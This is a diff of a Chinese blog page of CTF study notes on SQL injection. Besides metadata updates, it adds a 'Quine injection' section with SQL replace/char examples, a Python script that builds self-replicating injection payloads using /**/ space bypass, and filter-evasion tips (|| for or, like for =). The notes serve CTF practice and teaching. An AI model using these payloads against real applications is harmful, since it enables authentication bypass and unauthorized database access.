@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/bool.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5.png">
 <meta property="article:published_time" content="2024-07-16T12:00:00.000Z">
-<meta property="article:modified_time" content="2024-07-17T15:21:09.619Z">
+<meta property="article:modified_time" content="2024-07-24T05:26:35.951Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -276,7 +276,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          2.8k 字
         
       </span>
     
@@ -287,7 +287,7 @@
         
         
         
-          19 分钟
+          24 分钟
         
       </span>
     
@@ -337,7 +337,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年7月17日 晚上
+                    本文最后更新于 2024年7月24日 下午
                   
                 
               </p>
@@ -479,8 +479,31 @@
 
 <p>因为是同一个表，构成的新表就会得到所有的列的信息，从而进行绕过。</p>
 <p>例题参照<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2034">[NISACTF 2022]join-us</a></p>
+<h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35782055/article/details/130348274?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&utm_relevant_index=6">参考文章</a>，也是刷题偶观，记录一下</p>
+<p>quine注入即查询的结果是查询的语句，举个简单的例子</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;.&quot;,char(46),&quot;.&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>匹配字符串”.“中ascii码为46的字符并替换为”.“,也就是将”.“转换为”.”并返回</p>
+<p>在实际替换中，单引号会变成双引号，可以引入char(34)和char(39)进行替换，比如</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));<br></code></pre></td></tr></table></figure>
+
+<p>这里面是连续两个双引号用斜杠进行正常的输入，通过匹配会输出’’</p>
+<p>所以替换的就变成了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这一步就是替换单双引号</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39));<br></code></pre></td></tr></table></figure>
+
+<p>然后替换为相关字符</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>最后直接来个脚本吧，没太深入的明白，看看先能写题就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_sql</span>():<br>    sql = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入你的SQL语句, 不用写关键查询的信息 形如 1&#x27;union select #\n&quot;</span>)<br>    <span class="hljs-keyword">return</span> sql<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_quotes</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_base</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_base_to_sql</span>(<span class="hljs-params">sql, base</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_sql_with_base</span>(<span class="hljs-params">base, sql</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_sql</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;.&quot;&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 输入SQL语句</span><br>    sql = input_sql()<br>    <span class="hljs-comment"># 替换单引号为双引号</span><br>    sql2 = replace_quotes(sql)<br>    <span class="hljs-comment"># 生成base字符串</span><br>    base = generate_base()<br>    <span class="hljs-comment"># 将base添加到sql语句中</span><br>    sql_with_base = add_base_to_sql(sql2, base)<br>    <span class="hljs-comment"># 用base修补sql语句</span><br>    patched_sql = patch_sql_with_base(base.replace(<span class="hljs-string">&quot;.&quot;</span>, sql_with_base), sql)<br>    <span class="hljs-comment"># 格式化最终SQL语句</span><br>    final_sql = format_sql(patched_sql)<br>    <span class="hljs-comment"># 输出最终结果</span><br>    <span class="hljs-built_in">print</span>(final_sql)<br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/334">例题</a></p>
 <h3 id="四、刷题笔记"><a href="#四、刷题笔记" class="headerlink" title="四、刷题笔记"></a>四、刷题笔记</h3><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><h4 id="过滤-or"><a href="#过滤-or" class="headerlink" title="过滤 or"></a>过滤 or</h4><p>使用||代替</p>
 <h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤 &#x3D;"></a>过滤 &#x3D;</h4><p>使用like代替</p>
+<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用&#x2F;**&#x2F;绕过</p>
 
                 
               </div>
